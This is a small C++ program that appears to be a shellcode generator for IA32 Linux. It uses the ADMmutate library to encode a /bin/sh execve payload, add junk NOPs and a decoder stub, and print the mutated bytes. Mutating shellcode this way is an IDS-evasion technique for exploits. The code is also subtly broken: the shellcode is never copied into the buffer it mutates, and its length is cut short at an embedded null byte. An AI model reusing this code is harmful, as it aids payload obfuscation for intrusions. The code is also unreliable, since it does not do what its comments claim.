//As of now only IA32
#include "ADMmutate-0.8.4/ADMmutapi.h"
#include <iostream>
#include <string.h>


char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x14\x00\x00\x00\x65\x63\x68\x6f\x20\x27\x66\x6f\x72\x5f\x74\x68\x65\x5f\x6c\x6f\x6c\x7a\x27\x00\x57\x53\x89\xe1\xcd\x80";

int main()
{
	//printf("Welcome to the Shellcode generator.\n");
	size_t num_jnops = 10;
	char mutated_shellcode[1000*sizeof(char)];
	memset(&mutated_shellcode,(char)'\x90',sizeof(mutated_shellcode));
	
	struct morphctl* mutptr;
	struct morphctl mut;

	mut.upper = 0;
	mut.lower = 0;
	mut.banned = 0;
	mut.arch = IA32;
	mutptr = &mut;

	//set OS specific info for decoder,junk instr, pads, keyslide availability
	init_mutate(mutptr); 
	//iter through the mut at the location of the shellcode and code it with a key
	apply_key(&mutated_shellcode[0],strlen(shellcode),num_jnops-1,mutptr);
	//now we add in some junk nops according to our choice
	apply_jnops(&mutated_shellcode[0],num_jnops-1,mut);
	//takes our buffer, generates a decoder engine then places it at buff + num_jnops - sizeof(engine)
	apply_engine(&mutated_shellcode[0],strlen(shellcode),num_jnops-1,mut);

	for(int i = 0; i < sizeof(mutated_shellcode)-1; i++) //-1 to avoid the \x00
	{
		std::cout << mutated_shellcode[i];
	}
	return 0;
}